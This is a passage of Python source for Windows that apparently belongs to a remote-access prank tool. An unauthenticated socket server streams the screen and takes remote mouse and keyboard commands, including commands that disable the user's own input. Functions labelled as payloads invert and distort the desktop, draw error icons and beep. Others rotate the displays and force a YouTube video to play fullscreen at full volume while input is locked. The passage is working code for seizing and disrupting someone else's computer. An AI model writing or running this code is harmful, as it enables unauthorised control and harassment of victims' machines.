            cipher = AES.new(key, AES.MODE_EAX, nonce)
            plaintext = cipher.decrypt(ciphertext)
            try:
                cipher.verify(tag)
                return plaintext.decode("utf-8")
            except ValueError:
                return None

        message = (encrypt(TUTKEYPHONE, msg.encode("utf-8")))
        message = str(message).encode('utf-8')
        message = bytes(message)
        msg_length = len(message)
        send_length = str(msg_length).encode('utf-8')
        send_length += b' ' * (64 - len(send_length))
        client.send(send_length)
        client.send(message)
        client.close()
        print(f'Successfully sent {msg}, to client {serverip}')
    except TimeoutError as e:
        if toConnect is not None:
            print('Removing timed out connection,', toConnect)
        if isinstance(toConnect, tuple):
            ip, port = toConnect
            if f'{ip}:{port}' in varyhosts:
                varyhosts.remove(f'{ip}:{port}')
    except Exception as e:
        print(f'Error insend(timeout): {e}')

def send(serverip, text):
    """Sends a message to a specified server IP address."""
    insend(serverip, text)

def extract_value(input_str, start_delimiter):
    """Extracts a numerical value from a string based on a delimiter."""
    pattern = re.compile(rf'{re.escape(start_delimiter)}(\d+)(?:\s|$)')
    match = pattern.search(input_str)
    if match:
        return match.group(1)
    return None

def capture_screen():
    """Captures a screenshot of the current screen."""
    try:
        screenshot = pyautogui.screenshot()
        return np.array(screenshot)
    except Exception as e:
        return create_error_image(str(e))

def create_error_image(error_message):
    """Creates an error image with the given error message."""
    img = Image.new('RGB', (800, 600), color='black')
    d = ImageDraw.Draw(img)
    d.text((10, 10), f"Screen grab failed: {error_message}", fill=(255, 255, 255))
    return np.array(img)

def compare_images(img1, img2):
    """Compares two images and returns the difference and a boolean indicating changes."""
    diff = cv2.absdiff(img1, img2)
    return diff, np.any(diff != 0)

def send_screen_diff(conn, diff, full_image):
    """Sends the difference between two images over a socket connection."""
    try:
        img = Image.fromarray(diff)
        img_byte_arr = io.BytesIO()
        img.save(img_byte_arr, format='PNG')
        img_byte_arr = img_byte_arr.getvalue()
        is_full_image = b'1' if np.array_equal(diff, full_image) else b'0'
        conn.send(is_full_image)
        conn.send(len(img_byte_arr).to_bytes(4, byteorder='big'))
        conn.send(img_byte_arr)
    except Exception as e:
        print(f"Error sending screen diff: {e}")

def process_command(conn, command):
    """Processes a command received over a socket connection."""
    global control_enabled, overwrite_enabled
    try:
        if command == "DISCONNECT":
            raise ConnectionResetError("Client disconnected")
        elif command == "ENABLE_CONTROL":
            control_enabled = True
            print("Control enabled")
        elif command == "DISABLE_CONTROL":
            control_enabled = False
            print("Control disabled")
        elif command == "ENABLE_OVERWRITE":
            overwrite_enabled = True
            print("Overwrite enabled")
        elif command == "DISABLE_OVERWRITE":
            overwrite_enabled = False
            print("Overwrite disabled")
        elif command.startswith("MOUSE"):
            if control_enabled and not (overwrite_enabled and pyautogui.onScreen(*pyautogui.position())):
                _, x, y = command.split(',')
                pyautogui.moveTo(int(x), int(y))
        elif command.startswith("CLICK"):
            if control_enabled and not (overwrite_enabled and pyautogui.onScreen(*pyautogui.position())):
                _, button, state = command.split(',')[:3]
                if state == "down":
                    pyautogui.mouseDown(button=button)
                elif state == "up":
                    pyautogui.mouseUp(button=button)
                else:
                    pyautogui.click(button=button)
        elif command.startswith("KEY"):
            if control_enabled and not overwrite_enabled:
                keys = command.split(',')[1:]
                for key in keys:
                    pyautogui.keyDown(key)
                for key in keys:
                    pyautogui.keyUp(key)
        elif command == "Disable keyboard":
            print("Keyboard disabled")
            disable_keyboard()
        elif command == "Disable mouse":
            disable_mouse()
            print("Mouse disabled")
        elif command == "Enable keyboard":
            enable_keyboard()
            print("Keyboard enabled")
        elif command == "Enable mouse":
            enable_mouse()
            print("Mouse enabled")
        elif command == "PING":
            conn.send(b"PONG")
    except ConnectionResetError as e:
        print(f"Connection closed: {e}")
        return 'close'
    except Exception as e:
        print(f"Error processing command: {e}")

def screensharing_server():
    """Starts a server for screen sharing."""
    socket.timeout(10000) 
    host = socket.gethostbyname(socket.gethostname())
    port = 53074
    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server_socket.bind((host, port))
    server_socket.listen(1)
    server_socket.settimeout(10000) 
    print(f"SS: Listening on {host}:{port}")
    global control_enabled
    control_enabled = False
    global overwrite_enabled
    overwrite_enabled = False
    while True:
        try:
            conn, addr = server_socket.accept()
            print(f"Connected by {addr}")
            conn.send(b"Request accepted")
            screen_size = pyautogui.size()
            conn.send(f"{screen_size.width},{screen_size.height}".encode())
            previous_screen = None
            while True:
                try:
                    ready_to_read, _, _ = select.select([conn], [], [], 0.05)
                    if ready_to_read:
                        data = conn.recv(1024).decode()
                        if not data:
                            raise ConnectionResetError("Client disconnected") 
                        commands = data.split(COMMAND_DELIMITER)
                        for command in commands:
                            if command: 
                                toclose = process_command(conn, command)
                                if toclose == 'close':
                                    raise ConnectionResetError("Client disconnected")
                    current_screen = capture_screen()
                    if previous_screen is None:
                        send_screen_diff(conn, current_screen, current_screen)
                    else:
                        diff, has_changes = compare_images(previous_screen, current_screen)
                        if has_changes:
                            send_screen_diff(conn, current_screen, current_screen)
                    previous_screen = current_screen
                except ConnectionResetError:
                    print("Connection closed")
                    break
                except Exception as e:
                    print(f"Error in main loop: {e}")
                    traceback.print_exc()
                    if isinstance(e, socket.error):
                        break 
        except Exception as e:
            print(f"Error in connection handling: {e}")
            traceback.print_exc()
        finally:
            if 'conn' in locals():
                conn.close()
    server_socket.close()

def host_ss(client_device_ipport):
    """Starts a server to host a screen sharing session.

    Args:
        client_device_ipport (tuple): The IP address and port of the client device.
    """
    global running_ss
    running_ss = True
    try:
        screensharing_server() 
    except Exception as e:
        print(f"Fatal error in screen sharing: {e}")
        traceback.print_exc()
    finally:
        running_ss = False

def remote_desktop_client(ip_address, port=53074):
    """Starts a client for remote desktop control.

    Args:
        ip_address (str): The IP address of the server.
        port (int, optional): The port number. Defaults to 53074.
    """
    root = tk.Tk()
    client = RemoteDesktopClient(root, ip_address, port)
    root.bind("<Motion>", client.send_mouse_event)
    root.bind("<Button-1>", client.send_click_event)
    root.bind("<Button-2>", client.send_click_event)
    root.bind("<Button-3>", client.send_click_event)
    root.bind("<ButtonRelease-1>", client.send_release_event)
    root.bind("<ButtonRelease-2>", client.send_release_event)
    root.bind("<ButtonRelease-3>", client.send_release_event)
    root.bind("<Key>", client.send_key_event)
    root.mainloop()

class RemoteDesktopClient:
    """Client for remote desktop control."""
    def __init__(self, master, ip_address, port):
        self.master = master
        self.ip_address = ip_address
        self.port = port
        master.title("Remote Desktop Client")
        self.style = ttk.Style()
        self.style.theme_use('clam')
        self.style.configure('TButton', background='#2a2a2a', foreground='white')
        self.style.configure('TCheckbutton', background='#1e1e1e', foreground='white')
        self.style.configure('TEntry', fieldbackground='#2a2a2a', foreground='white')
        self.style.configure('TScale', background='#1e1e1e', troughcolor='#2a2a2a')
        self.frame = ttk.Frame(master, padding="10")
        self.frame.pack(fill=tk.BOTH, expand=True)
        self.canvas = tk.Canvas(self.frame, bg='black')
        self.canvas.pack(fill=tk.BOTH, expand=True)
        control_frame = ttk.Frame(self.frame)
        control_frame.pack(fill=tk.X, pady=10)
        self.ip_label = ttk.Label(control_frame, text=f"Host IP: {self.ip_address}")
        self.ip_label.pack(side=tk.LEFT, padx=5)
        self.connect_button = ttk.Button(control_frame, text="Connect", command=self.connect)
        self.connect_button.pack(side=tk.LEFT, padx=5)
        self.disconnect_button = ttk.Button(control_frame, text="Disconnect", command=self.disconnect, state=tk.DISABLED)
        self.disconnect_button.pack(side=tk.LEFT, padx=5)
        self.control_var = tk.BooleanVar()
        self.control_checkbox = ttk.Checkbutton(control_frame, text="Enable Control", variable=self.control_var, command=self.toggle_control)
        self.control_checkbox.pack(side=tk.LEFT, padx=5)
        self.scale_var = tk.DoubleVar(value=1.0)
        self.scale_slider = ttk.Scale(control_frame, from_=0.1, to=2.0, orient=tk.HORIZONTAL, variable=self.scale_var, command=self.update_scale)
        self.scale_slider.pack(side=tk.LEFT, padx=5)
        self.scale_label = ttk.Label(control_frame, text="Scale: 1.0x")
        self.scale_label.pack(side=tk.LEFT, padx=5)
        self.control_options = ["Disable keyboard", "Disable mouse", "Enable keyboard", "Enable mouse"]
        self.control_dropdown = ttk.Combobox(control_frame, values=self.control_options, state="readonly")
        self.control_dropdown.pack(side=tk.LEFT, padx=5)
        self.control_dropdown.set(self.control_options[0])
        self.send_event_button = ttk.Button(control_frame, text="Send Event", command=self.send_control_event)
        self.send_event_button.pack(side=tk.LEFT, padx=5)
        self.connection_status_label = ttk.Label(control_frame, text="Connection Status: Disconnected (Ping: N/A)")
        self.connection_status_label.pack(side=tk.RIGHT, padx=5)
        self.socket = None
        self.connected = False
        self.host_screen_size = (0, 0)
        self.scale_factor = 1.0
        self.current_image = None
        self.master.bind("<Configure>", self.on_resize)
        self.last_mouse_position = (0, 0)
        self.mouse_update_interval = 0.05
        self.last_mouse_update_time = 0

    def connect(self):
        """Attempts to connect to the remote server."""
        self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.socket.settimeout(5)
        try:
            self.socket.connect((self.ip_address, self.port))
            response = self.socket.recv(1024).decode()
            if response == "Request accepted":
                self.connected = True
                self.connect_button.config(state=tk.DISABLED)
                self.disconnect_button.config(state=tk.NORMAL)
                size_data = self.socket.recv(1024).decode().split(',')
                self.host_screen_size = (int(size_data[0]), int(size_data[1]))
                self.update_scale()
                self.update_connection_status("Connection Stable")
                threading.Thread(target=self.receive_screen, daemon=True).start()
        except socket.timeout:
            self.update_connection_status("Connection Failed: Timeout")
            messagebox.showerror("Connection Error", "Connection timed out")
        except Exception as e:
            self.update_connection_status("Connection Failed")
            messagebox.showerror("Connection Error", str(e))

    def disconnect(self):
        """Disconnects from the remote server."""
        if self.connected:
            try:
                self.socket.send(f"DISCONNECT{COMMAND_DELIMITER}".encode())
                self.socket.close()
            except:
                pass
            finally:
                self.connected = False
                self.connect_button.config(state=tk.NORMAL)
                self.disconnect_button.config(state=tk.DISABLED)
                self.update_connection_status("Disconnected")

    def update_connection_status(self, status, ping=None):
        """Updates the connection status label."""
        ping_str = f"Ping: {ping:.2f}ms" if ping is not None else "Ping: N/A"
        self.connection_status_label.config(text=f"Connection Status: {status} ({ping_str})")

    def toggle_control(self):
        """Toggles remote control on or off."""
        if self.connected:
            if self.control_var.get():
                self.socket.send(f"ENABLE_CONTROL{COMMAND_DELIMITER}".encode())
            else:
                self.socket.send(f"DISABLE_CONTROL{COMMAND_DELIMITER}".encode())

    def send_control_event(self):
        """Sends a control event to the server."""
        if self.connected:
            event = self.control_dropdown.get()
            self.socket.send(f"{event}{COMMAND_DELIMITER}".encode())

    def update_scale(self, *args):
        """Updates the display scale factor."""
        self.scale_factor = self.scale_var.get()
        self.scale_label.config(text=f"Scale: {self.scale_factor:.1f}x")
        self.resize_image()

    def resize_image(self):
        """Resizes the displayed image based on the scale factor."""
        if self.current_image:
            scaled_size = (int(self.host_screen_size[0] * self.scale_factor),
                           int(self.host_screen_size[1] * self.scale_factor))
            resized_image = self.current_image.resize(scaled_size, Image.LANCZOS)
            self.display_image(resized_image)

    def on_resize(self, event=None):
        """Handles window resize events."""
        if self.current_image:
            self.resize_image()
            self.master.geometry("")

    def receive_screen(self):
        """Continuously receives screen updates from the server."""
        while self.connected:
            try:
                self.socket.settimeout(5) 
                is_full_image = self.socket.recv(1) == b'1'
                size = int.from_bytes(self.socket.recv(4), byteorder='big')
                img_data = b''
                while len(img_data) < size:
                    chunk = self.socket.recv(size - len(img_data))
                    if not chunk:
                        raise RuntimeError("socket connection broken")
                    img_data += chunk
                image = Image.open(io.BytesIO(img_data))
                self.current_image = image
                self.resize_image()
                self.update_connection_status("Connection Stable")
            except socket.timeout:
                self.update_connection_status("Connection Weak")
            except Exception as e:
                print(f"Error receiving screen: {e}")
                traceback.print_exc()
                self.update_connection_status("Connection Failed")
                self.disconnect()
                break

    def display_image(self, image):
        """Displays the received image on the canvas."""
        photo = ImageTk.PhotoImage(image)
        self.canvas.delete("all")
        self.canvas.config(width=image.width, height=image.height)
        self.canvas.create_image(0, 0, anchor=tk.NW, image=photo)
        self.canvas.image = photo

    def send_mouse_event(self, event):
        """Sends mouse movement events to the server."""
        if self.connected and self.control_var.get():
            current_time = time.time()
            if current_time - self.last_mouse_update_time >= self.mouse_update_interval:
                x = int(event.x / self.scale_factor)
                y = int(event.y / self.scale_factor)
                self.socket.send(f"MOUSE,{x},{y}{COMMAND_DELIMITER}".encode())
                self.last_mouse_update_time = current_time
                self.last_mouse_position = (x, y)

    def send_click_event(self, event):
        """Sends mouse click events to the server."""
        if self.connected and self.control_var.get():
            x, y = self.last_mouse_position
            button = "left"
            if event.num == 2:
                button = "middle"
            elif event.num == 3:
                button = "right"
            self.socket.send(f"CLICK,{button},down,{x},{y}{COMMAND_DELIMITER}".encode())

    def send_release_event(self, event):
        """Sends mouse release events to the server."""
        if self.connected and self.control_var.get():
            x, y = self.last_mouse_position
            button = "left"
            if event.num == 2:
                button = "middle"
            elif event.num == 3:
                button = "right"
            self.socket.send(f"CLICK,{button},up,{x},{y}{COMMAND_DELIMITER}".encode())

    def send_key_event(self, event):
        """Sends keyboard events to the server."""
        if self.connected and self.control_var.get():
            key = event.char
            if not key:
                key = event.keysym 
            key_state = "down" if event.type == '2' else "up"
            self.socket.send(f"KEY,{key},{key_state}{COMMAND_DELIMITER}".encode())

def client_ss(ip):
    """Connects to the screen sharing server at the specified IP address.

    Args:
        ip (str): The IP address of the server.
    """
    remote_desktop_client(ip, 53074)

def play_tone(frequency, duration):
    """Plays a tone at the specified frequency and duration.

    Args:
        frequency (int): The frequency of the tone in Hertz.
        duration (int): The duration of the tone in milliseconds.
    """
    print(f'Playing {frequency}hz for a duration of {duration}')
    winsound.Beep(frequency, duration)

def play_shepard_tone(start_hz, end_hz, duration):
    """Plays a Shepard tone."""
    samples_per_second = 44100
    t = np.linspace(0, duration, int(samples_per_second * duration), False)
    f = start_hz * np.power(end_hz/start_hz, t/duration)
    wave = 0.5 * np.sin(2*np.pi*f*t)
    info = sd.query_devices()
    device_id = None
    for i, device in enumerate(info):
        if device['max_output_channels'] > 0:
            device_id = i
            break
    if device_id is not None:
        sd.play(wave, samples_per_second, device=device_id)
        sd.wait()
    else:
        print('No available output device found')

def payload_1():
    """Executes a visual and audio payload."""
    desk = win32gui.GetDC(0)
    x = win32api.GetSystemMetrics(0)
    y = win32api.GetSystemMetrics(1)
    for i in range(30):
        win32gui.PatBlt(desk, random.randrange(x), random.randrange(y), random.randrange(x), random.randrange(y), win32con.DSTINVERT)
        winsound.Beep(440, 50)
        win32gui.PatBlt(desk, random.randrange(x), random.randrange(y), random.randrange(x), random.randrange(y), win32con.DSTINVERT)
        winsound.Beep(220, 50)
        win32gui.PatBlt(desk, random.randrange(x), random.randrange(y), random.randrange(x), random.randrange(y), win32con.DSTINVERT)
        winsound.Beep(660, 50)
        time.sleep(10)
    win32gui.ReleaseDC(desk, win32gui.GetDesktopWindow())
    win32gui.DeleteDC(desk)

def payload_2():
    """Executes a visual and audio payload."""
    x, y = GetSystemMetrics(0), GetSystemMetrics(1)

    def asidjhb():
        """Plays a Shepard tone."""
        play_shepard_tone(100, 1000, 6)

    threading.Thread(target=asidjhb).start()

    def flash():
        """Flashes the screen."""
        for _ in range(100):
            dc = GetDC(0)
            BitBlt(dc, 0, 0, x, y, dc, 0, 0, NOTSRCCOPY)
            DeleteDC(dc)
            time.sleep(1)

    def invert_once():
        """Inverts the screen colors."""
        dc = GetDC(0)
        BitBlt(dc, 0, 0, x, y, dc, 0, 0, NOTSRCCOPY)
        DeleteDC(dc)

    def tunnel():
        """Creates a tunnel effect on the screen."""
        dc = GetDC(0)
        StretchBlt(dc, 0, 0, x, y, dc, -20, -20, x+40, y+40, SRCCOPY)
        DeleteDC(dc)

    def draw_icons():
        """Draws random icons on the screen."""
        dc = GetDC(0)
        IconWarning = LoadIcon(None, IDI_WARNING)
        IconError = LoadIcon(None, IDI_ERROR)
        DrawIcon(dc, random.randrange(x), random.randrange(y), random.choice([IconError, IconWarning]))
        DrawIcon(dc, random.randrange(x), random.randrange(y), random.choice([IconError, IconWarning]))
        DeleteDC(dc)

    for i in range(80):
        time.sleep(30)
        tunnel()
        draw_icons()
        if i % 3 == 0:
            invert_once()

def payload_3():
    """Draws random shapes on the screen with random colors and sounds."""
    hdc = win32gui.GetDC(0)
    pen_color = win32api.RGB(randint(0, 255), randint(0, 255), randint(0, 255))
    pen = win32gui.CreatePen(win32con.PS_SOLID, 1, pen_color)
    brush_color = win32api.RGB(randint(0, 255), randint(0, 255), randint(0, 255))
    brush = win32gui.CreateSolidBrush(brush_color)
    win32gui.SelectObject(hdc, pen)
    win32gui.SelectObject(hdc, brush)
    screen_width = win32api.GetSystemMetrics(0)
    screen_height = win32api.GetSystemMetrics(1)
    timeout = 8
    timeout_start = time.time()
    while time.time() < timeout_start + timeout:
        x = randint(0, screen_width)
        y = randint(0, screen_height)
        width = randint(10, screen_width // 10)
        height = randint(10, screen_height // 10)
        if randint(0, 1) == 0:
            win32gui.Ellipse(hdc, x, y, x + width, y + height)
        else:
            win32gui.Rectangle(hdc, x, y, x + width, y + height)
        pen_color = win32api.RGB(randint(0, 255), randint(0, 255), randint(0, 255))
        pen = win32gui.CreatePen(win32con.PS_SOLID, 1, pen_color)
        brush_color = win32api.RGB(randint(0, 255), randint(0, 255), randint(0, 255))
        brush = win32gui.CreateSolidBrush(brush_color)
        win32gui.SelectObject(hdc, pen)
        win32gui.SelectObject(hdc, brush)
        play_tone(1000, 10)
        slp(0.01)

def find_window(search_term):
    def callback(hwnd, windows):
        if win32gui.IsWindowVisible(hwnd) and win32gui.IsWindowEnabled(hwnd):
            window_title = win32gui.GetWindowText(hwnd)
            _, pid = win32process.GetWindowThreadProcessId(hwnd)
            try:
                process = psutil.Process(pid)
                if (search_term.lower() in window_title.lower() or 
                    search_term.lower() in process.name().lower()):
                    windows.append(hwnd)
            except psutil.NoSuchProcess:
                pass
        return True

    windows = []
    win32gui.EnumWindows(callback, windows)
    return windows

def bring_window_to_foreground(search_term):
    windows = find_window(search_term)
    if windows:
        hwnd = windows[0]  # Use the first matching window
        shell = win32com.client.Dispatch("WScript.Shell")
        shell.SendKeys('%')  # Alt key to activate the window
        win32gui.SetForegroundWindow(hwnd)
        print(f"Brought window matching '{search_term}' to foreground")
    else:
        print(f"No visible window found matching '{search_term}'")

def makethescreendorotations(duration):
    """Rotates the screen continuously for a specified duration."""
    duration = int(duration)
    screen = rotatescreen.get_primary_display()
    start_pos = screen.current_orientation
    end_time = time.time() + duration
    i = 0
    while time.time() < end_time:
        i += 1
        pos = abs((start_pos - i * 90) % 360)
        screen.rotate_to(pos)
        slp(0.7)
    screen.set_landscape()

def flipscreen():
    """Flips the screen upside down."""
    for i in rotatescreen.get_displays():
        i.set_landscape_flipped()

def screenlandscape():
    """Sets the screen orientation to landscape."""
    for i in rotatescreen.get_displays():
        i.set_landscape()

def screenportrait():
    """Sets the screen orientation to portrait (left)."""
    for i in rotatescreen.get_displays():
        i.set_portrait()

def screenportraitflipped():
    """Sets the screen orientation to portrait flipped (right)."""
    for i in rotatescreen.get_displays():
        i.set_portrait_flipped()

def chrome_window_control_maximize():
    def callback(hwnd, windows):
        if win32gui.IsWindowVisible(hwnd) and win32gui.IsWindowEnabled(hwnd):
            _, pid = win32process.GetWindowThreadProcessId(hwnd)
            try:
                process = psutil.Process(pid)
                if process.name().lower() == "chrome.exe":
                    title = win32gui.GetWindowText(hwnd)
                    if title and title.strip():  # Ignore empty or whitespace-only titles
                        windows.append((hwnd, title))
            except psutil.NoSuchProcess:
                pass
        return True

    windows = []
    win32gui.EnumWindows(callback, windows)
    chrome_windows = windows
    if not chrome_windows:
        print("No Chrome windows found with non-empty titles.")
        return

    for hwnd, title in chrome_windows:
        win32gui.ShowWindow(hwnd, win32con.SW_SHOW)
        win32gui.ShowWindow(hwnd, win32con.SW_RESTORE)
        win32gui.SetForegroundWindow(hwnd)
        win32gui.ShowWindow(hwnd, win32con.SW_RESTORE)
        win32gui.ShowWindow(hwnd, win32con.SW_MAXIMIZE)
        win32gui.SetForegroundWindow(hwnd)
        win32gui.SetWindowPos(hwnd, win32con.HWND_TOPMOST, 0, 0, 0, 0, 
                                win32con.SWP_NOMOVE | win32con.SWP_NOSIZE)
        shell = win32com.client.Dispatch("WScript.Shell")
        shell.SendKeys('%')  # Alt key to activate the window
        win32gui.SetForegroundWindow(hwnd)
    
        print(f"Actions performed on Chrome window: {title}")

def playYTvidfullscreen(video_url, starttime=None, endingtime=None):
    """Plays a YouTube video in full screen."""

    if starttime == '':
        starttime = None
    if endingtime == '':
        endingtime = None
    if not video_url:
        print("No video URL provided.")
        return
    
    def get_youtube_video_duration(video_url):
        """Gets the duration of a YouTube video."""
        headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'
        }
        response = requests.get(video_url, headers=headers)
        if response.status_code != 200:
            raise Exception(f"Failed to load page: {response.status_code}")
        soup = BeautifulSoup(response.text, 'html.parser')
        scripts = soup.find_all('script')
        for script in scripts:
            if 'ytInitialPlayerResponse' in script.string if script.string else '':
                script_content = script.string
                break
        else:
            raise Exception("Couldn't find ytInitialPlayerResponse in the page")
        duration_match = re.search(r'"approxDurationMs":"(\d+)"', script_content)
        if not duration_match:
            raise Exception("Couldn't find video duration in the page")
        duration_ms = int(duration_match.group(1))
        duration_seconds = duration_ms / 1000
        return duration_seconds

    vid_length = math.floor(get_youtube_video_duration(video_url))
    print(f'Specified video length is: {vid_length}')
    
    if endingtime is not None and endingtime > vid_length:
        print("Ending time is more than the video time, error.")
        return False, "endingtime>vidlength"
    if starttime is not None and starttime > vid_length:
        print("Starting time is more than the video time, error.")
        return False, "starttime>vidlength"

    def tryandretryuntilwork(*args):
        """Retries a function call until it succeeds."""
        def run():
            return driver.execute_script(*args)
        while True:
            try:
                return run()
            except Exception as e:
                print(e)
                time.sleep(0.5)
                continue

    def skipadbutton():
        """Skips YouTube ads if present."""
        skip_button_exists = len(driver.find_elements(By.XPATH, '//button[contains(@class, "ytp-ad-skip-button")]')) > 0
        print(f'Does the skip button exist? {skip_button_exists}')
        if skip_button_exists:
            skip_button = WebDriverWait(driver, 15).until(
                EC.element_to_be_clickable((By.XPATH, '//button[contains(@class, "ytp-ad-skip-button")]'))
            )
            skip_button.click()

    def getcurrentYTtime():
        """Gets the current playback time of the YouTube video."""
        return tryandretryuntilwork("return arguments[0].currentTime", video)

    def play():
        """Plays the YouTube video."""
        tryandretryuntilwork("arguments[0].play()", video)
        print("Playing...")

    def pause():
        """Pauses the YouTube video."""
        tryandretryuntilwork("arguments[0].pause()", video)
        print("Pausing...")

    def detectifpause():
        """Checks if the YouTube video is paused."""
        return tryandretryuntilwork("return arguments[0].paused", video)

    def mute():
        """Mutes the YouTube video."""
        tryandretryuntilwork("arguments[0].muted = true", video)
        print("Muting...")

    def unmute():
        """Unmutes the YouTube video."""
        tryandretryuntilwork("arguments[0].muted = false", video)
        print("Unmuting...")

    def setytvolume(volume):
        """Sets the volume of the YouTube video."""
        if volume > 1:
            volume = volume / 100
        tryandretryuntilwork("arguments[0].volume = arguments[1]", video, volume)
        print("Changing volume...")


    webdriver_path = os.path.join(os.path.dirname(__file__), 'chromedriver')
    print(f'Webdriver location: {webdriver_path}')
    options = webdriver.ChromeOptions()
    options.add_argument("start-minimized")  # Start Chrome minimized
    options.add_experimental_option("excludeSwitches", ["enable-automation"])
    options.add_experimental_option('useAutomationExtension', False)
    driver = webdriver.Chrome(options=options)
    disable_keyboard()
    disable_mouse()
    minimize_process_via_name('chrome.exe')
    driver.get(video_url)
    minimize_process_via_name('chrome.exe')
    wait = WebDriverWait(driver, 15)
    video = wait.until(EC.presence_of_element_located((By.TAG_NAME, "video")))

    driver_process = psutil.Process(driver.service.process.pid)
    chrome_pid = driver_process.pid
    print(f"Chrome PID: {chrome_pid}") # literally does not work in anything

    minimize_process_via_name('chrome.exe')

    def setYTtime(time):
        """Sets the playback time of the YouTube video."""
        tryandretryuntilwork("arguments[0].currentTime = arguments[1]", video, time)
        print("Changing playback time...")

    mute()
    minimize_process_via_name('chrome.exe')
    wait3sec = time.time() + 3
    while True:
        try:
            video = driver.find_element(By.TAG_NAME, "video")
            skipadbutton()
            end_time = math.floor(tryandretryuntilwork("return arguments[0].duration", video))
            print("End time:", end_time)
            if detectifpause():
                play()
            if end_time != vid_length:
                wait3sec = time.time() + 3
                tryandretryuntilwork("arguments[0].currentTime = arguments[0].duration - 0.2", video)
                print("Ad detected, skipping...")
            elif time.time() > wait3sec:
                print("No ad detected, continuing...")
                tryandretryuntilwork("arguments[0].currentTime = 0", video)
                break
        except selenium.common.exceptions.StaleElementReferenceException:
            print("Stale element reference exception occurred. Trying to find the video element again.")
            continue
        time.sleep(1)

    def simulate_user_interaction():
        """Simulates user interaction with the YouTube video."""
        actions = ActionChains(driver)
        actions.send_keys('f')  # Full screen using 'f' key
        actions.perform()
        time.sleep(1)

 

    setytvolume(0.5)

    chrome_window_control_maximize()
    unmute() 
    simulate_user_interaction()  # Enter full-screen
    while detectifpause():
        play()
        time.sleep(0.8)
    setytvolume(1)
    print('Skipped all ads, or there were just no ads.. ')
    unmute()  # Unmute after ad-skipping

    if starttime is not None:
        setYTtime(starttime)
    else:
        setYTtime(0)

    if endingtime is not None:
        while getcurrentYTtime() < endingtime:
            time.sleep(0.1)
            print(getcurrentYTtime())
    else:
        while getcurrentYTtime() < end_time - 2.5:
            time.sleep(1)

    driver.quit() 
    # no need to unset always on top here, as the driver kills it
    enable_keyboard()
    enable_mouse()

def playYTvidinbackground(video_url, starttime=None, endingtime=None):
    """Plays a YouTube video in the background."""
    
    if starttime == '':
        starttime = None
    if endingtime == '':
        endingtime = None
    if not video_url:
        print("No video URL provided.")
        return
    

    def get_youtube_video_duration(video_url):
        """Gets the duration of a YouTube video."""
        headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'
        }
        response = requests.get(video_url, headers=headers)
        if response.status_code != 200:
            raise Exception(f"Failed to load page: {response.status_code}")
        soup = BeautifulSoup(response.text, 'html.parser')
        scripts = soup.find_all('script')
        for script in scripts:
            if 'ytInitialPlayerResponse' in script.string if script.string else '':
                script_content = script.string
                break
        else:
            raise Exception("Couldn't find ytInitialPlayerResponse in the page")
        duration_match = re.search(r'"approxDurationMs":"(\d+)"', script_content)
        if not duration_match:
            raise Exception("Couldn't find video duration in the page")
        duration_ms = int(duration_match.group(1))
        duration_seconds = duration_ms / 1000
        return duration_seconds

    vid_length = math.floor(get_youtube_video_duration(video_url))
    print(f'Specified video length is: {vid_length}')
    if endingtime is not None and endingtime > vid_length:
        print("ending time is more than the vid time, error.")
        return False, "endingtime>vidlength"
    if starttime is not None and starttime > vid_length:
        print("starting time is more than the vid time, error.")
        return False, "starttime>vidlength"

    def tryandretryuntilwork(*args):
        """Retries a function call until it succeeds."""
        def run():
            return driver.execute_script(*args)
        while True:
            try:
                return run()
            except Exception as e:
                print(e)
                time.sleep(0.5)
                continue

    def skipadbutton():
        """Skips YouTube ads if present."""
        skip_button_exists = len(driver.find_elements(By.XPATH, '//button[contains(@class, "ytp-ad-skip-button")]')) > 0
        print(f'Does the skip button exist? {skip_button_exists}')
        if skip_button_exists:
            skip_button = WebDriverWait(driver, 15).until(
                EC.element_to_be_clickable((By.XPATH, '//button[contains(@class, "ytp-ad-skip-button")]'))
            )
            skip_button.click()

    def getcurrentYTtime():
        """Gets the current playback time of the YouTube video."""
        return tryandretryuntilwork("return arguments[0].currentTime", video)

    def play():
        """Plays the YouTube video."""
        tryandretryuntilwork("arguments[0].play()", video)
        print("playing...")

    def pause():
        """Pauses the YouTube video."""
        tryandretryuntilwork("arguments[0].pause()", video)
        print("pausing...")

    def detectifpause():
        """Checks if the YouTube video is paused."""
        return tryandretryuntilwork("return arguments[0].paused", video)

    def detectifmuted():
        """Checks if the YouTube video is muted."""
        return tryandretryuntilwork("return arguments[0].muted", video)

    def mute():
        """Mutes the YouTube video."""
        tryandretryuntilwork("arguments[0].muted = true", video)
        print("muting...")

    def unmute():
        """Unmutes the YouTube video."""
        tryandretryuntilwork("arguments[0].muted = false", video)
        print("unmuting...")

    def setytvolume(volume):
        """Sets the volume of the YouTube video."""
        if volume > 1:
            volume = volume / 100
        tryandretryuntilwork("arguments[0].volume = arguments[1]", video, volume)
        print("Changing volume...")

    webdriver_path = os.path.join(os.path.dirname(__file__), 'chromedriver')
    print(f'Webdriver location: {webdriver_path}')
    options = webdriver.ChromeOptions()
    options.add_argument('--headless')
    driver = webdriver.Chrome(options=options)
    driver.get(video_url)
    wait = WebDriverWait(driver, 15)
    video = wait.until(EC.presence_of_element_located((By.TAG_NAME, "video")))
    if not detectifmuted():
        mute()

    def setYTtime(time):
        """Sets the playback time of the YouTube video."""
        tryandretryuntilwork("arguments[0].currentTime = arguments[1]", video, time)
        print("Changing playback time...")

    def simulate_user_interaction():
        """Simulates user interaction with the YouTube video."""
        actions = ActionChains(driver)
        actions.move_to_element(driver.find_element(By.TAG_NAME, 'body')).click().perform()
        time.sleep(1)
        actions.move_to_element(video).click().perform()
        time.sleep(1)
        actions.send_keys(Keys.SPACE).perform()
        time.sleep(1)

    if not detectifmuted():
        mute()
    simulate_user_interaction()
    if not detectifmuted():
        mute()
    wait3sec = time.time() + 3
    while True:
        try:
            video = driver.find_element(By.TAG_NAME, "video")
            skipadbutton()
            if not detectifmuted():
                mute()
            end_time = math.floor(tryandretryuntilwork("return arguments[0].duration", video))
            print("End time:", end_time)
            if detectifpause():
                play()
            if end_time != vid_length:
                wait3sec = time.time() + 3
